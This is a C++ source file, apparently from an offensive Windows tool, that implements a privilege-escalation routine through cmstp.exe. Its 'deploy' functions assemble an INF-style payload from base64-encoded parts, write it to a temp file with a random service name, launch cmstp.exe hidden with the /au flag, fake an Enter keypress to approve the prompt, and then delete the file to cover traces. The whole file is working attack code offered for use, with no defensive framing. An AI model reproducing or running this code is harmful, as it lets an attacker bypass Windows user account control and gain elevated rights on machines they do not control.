
#include <windows.h>
#include <filesystem>
#include <Tlhelp32.h>
#include <fstream>
#include <sstream>
#include <codecvt>
#include <locale>
#include <random>
#include <string>

#include "utils.hh"

// decode base64 encoded string (credits) - stack overflow & ferret
std::string utils::base64Decode(const std::string_view& base64String) {
    const uint8_t base64LookupTable[] = {
        62,  255, 62,  255, 63,  52,  53, 54, 55, 56, 57, 58, 59, 60, 61, 255,
        255, 0,   255, 255, 255, 255, 0,  1,  2,  3,  4,  5,  6,  7,  8,  9,
        10,  11,  12,  13,  14,  15,  16, 17, 18, 19, 20, 21, 22, 23, 24, 25,
        255, 255, 255, 255, 63,  255, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35,
        36,  37,  38,  39,  40,  41,  42, 43, 44, 45, 46, 47, 48, 49, 50, 51
    };
    static_assert(sizeof(base64LookupTable) == 'z' - '+' + 1);

    std::string decodedString;
    int decodedValue = 0, bitsRemaining = -8;

    for (uint8_t c : base64String) {
        if (c < '+' || c > 'z')
            break;

        c -= '+';
        if (base64LookupTable[c] >= 64)
            break;

        decodedValue = (decodedValue << 6) + base64LookupTable[c];
        bitsRemaining += 6;
        if (bitsRemaining >= 0) {
            decodedString.append(1, char((decodedValue >> bitsRemaining) & 0xFF));
            bitsRemaining -= 8;
        }
    }

    return decodedString;
}

// start a process by it's name (credits) - msdn & ferret, also it's kinda fucked
bool utils::createProcess(const std::string& szCommandLine) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.wShowWindow = SW_HIDE; // use SW_HIDE instead of false

    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL,
        const_cast<LPSTR>(szCommandLine.c_str()),
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi)
        )
    {
        // retrieve error code and print meaningful error message
        DWORD errorCode = GetLastError();
        std::cerr << "failed to create process. error code: " << errorCode << std::endl;
        return false;
    }

    // use smart handles for automatic cleanup
    std::unique_ptr<void, decltype(&CloseHandle)> processHandle(pi.hProcess, &CloseHandle);
    std::unique_ptr<void, decltype(&CloseHandle)> threadHandle(pi.hThread, &CloseHandle);

    // no need to manually close the handles anymore
    return true;
}

// kill a process by it's name - slight changes by ferret, detailed in docs
void utils::killByName(const std::string& processName) {
    const char* filename = processName.c_str();
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof(pEntry);
    BOOL hRes = Process32First(hSnapShot, &pEntry);
    while (hRes)
    {
        if (strcmp(pEntry.szExeFile, filename) == 0)
        {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
                (DWORD)pEntry.th32ProcessID);
            if (hProcess != NULL)
            {
                TerminateProcess(hProcess, 9);
                CloseHandle(hProcess);
            }
        }
        hRes = Process32Next(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);
}

// get a random sequence of chars (credits) - stack overflow & ferret
std::string utils::randomString(size_t nLength) {
    std::random_device rd;
    std::mt19937 engine(rd());
    const std::string charset =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
    std::uniform_int_distribution<size_t> distribution(0, charset.size() - 1);
    std::string str(nLength, ' ');
    for (size_t i = 0; i < nLength; ++i) {
        str[i] = charset[distribution(engine)];
    }
    return str;
}

// assembles the payload by decoding the b64 payload parts - slight changes by ferret, detailed in docs
std::string deploy::craftPayload(const std::string& szExecutablePath) {
    const std::string randName = utils::randomString(8);

    const std::string part1 = utils::base64Decode(payload::part1);
    const std::string part2 = utils::base64Decode(payload::part2);

    std::string payload;
    payload.reserve(part1.size() + szExecutablePath.size() + part2.size() + 50);

    payload += part1;
    payload += '\n';
    payload += szExecutablePath;
    payload += '\n';
    payload += part2;
    payload += '\n';
    payload += "ServiceName=\"";
    payload += randName;
    payload += "\"\n";
    payload += "ShortSvcName=\"";
    payload += randName;
    payload += "\"\n";

    return payload;
}

// writes the payload to disk - slight changes by ferret, detailed in docs
void deploy::writePayload(const std::string& szExecutablePath) {
    std::filesystem::path iniLocation(std::filesystem::temp_directory_path());
    std::filesystem::path iniFile("tmp.ini");
    std::filesystem::path fullPath(iniLocation / iniFile);

    try {
        std::filesystem::remove(fullPath);
    }
    catch (const std::filesystem::filesystem_error& error) {
        // handle a lovely error - "failed to remove the file"
    }

    std::ofstream fileStream(fullPath);
    if (fileStream.is_open()) {
        try {
            fileStream << deploy::craftPayload(szExecutablePath);
        }
        catch (const std::ofstream::failure& error) {
            // handle a lovely error - "failed to write to the file"
        }
    }
    else {
        // handle a lovely error - "failed to open the file"
    }
}


// runs the payload to elevate the privileges - slight changes by ferret, detailed in docs
bool deploy::runPayload() {
    const std::string iniFileName = "tmp.ini";
    const std::string executableName = "cmstp.exe";

    std::filesystem::path iniLocation(std::filesystem::temp_directory_path());
    std::filesystem::path iniFile(iniFileName);
    std::filesystem::path fullPath(iniLocation / iniFile);

    utils::killByName("cmstp.exe");

    if (!utils::createProcess(executableName + " /au " + fullPath.string())) return false; 

    Sleep(500);

    // send enter to the window 
    keybd_event(0x0D, 0, 0, 0);

    return true;
}

// cleans up the files left from the payload - slight changes by ferret, detailed in docs
bool deploy::cleanup() {
    std::filesystem::path iniLocation(std::filesystem::temp_directory_path());
    std::filesystem::path iniFile("tmp.ini");
    std::filesystem::path fullPath(iniLocation / iniFile);

    if (std::filesystem::exists(fullPath)) {
        std::error_code ec;
        std::filesystem::remove(fullPath, ec);
        if (ec) {
        }
    }

    return true;
}
